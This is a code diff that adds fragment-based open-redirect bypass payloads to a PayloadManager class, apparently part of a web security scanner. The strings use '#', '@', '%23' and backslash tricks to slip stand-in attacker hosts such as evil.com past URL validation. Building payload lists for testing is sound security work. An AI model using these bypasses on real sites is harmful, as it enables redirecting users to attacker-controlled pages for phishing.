@@ -41,7 +41,24 @@ class PayloadManager:
             "@{target_domain}", "\\\\{target_domain}", "{target_domain}\\\\", 
             "https://{target_domain}.attacker.com", "https://attacker.com/{target_domain}",
             "/%09/{target_domain}", "/%09https://{target_domain}/", "/%2f{target_domain}",
-            "//%e2%80%ae@{target_domain}", "//%00{target_domain}"
+            "//%e2%80%ae@{target_domain}", "//%00{target_domain}",
+            # Fragment-based bypass payloads
+            "{target_domain}#", 
+            "{target_domain}#hackxpert.com",
+            "evil.com#{target_domain}",
+            "https://evil.com#{target_domain}",
+            "{target_domain}#https://hackxpert.com",
+            "https://{target_domain}#",
+            "http://{target_domain}#",
+            "//{target_domain}#",
+            "https://evil.com/#{target_domain}",
+            "https://{target_domain}@evil.com#",
+            "https://{target_domain}@evil.com#hackxpert.com",
+            "{target_domain}#.evil.com",
+            "{target_domain}/%23/",
+            "{target_domain}\\#",
+            "{target_domain}%23",
+            "https://{target_domain}%23@evil.com"
         ]
         
         # Parameter-based payloads
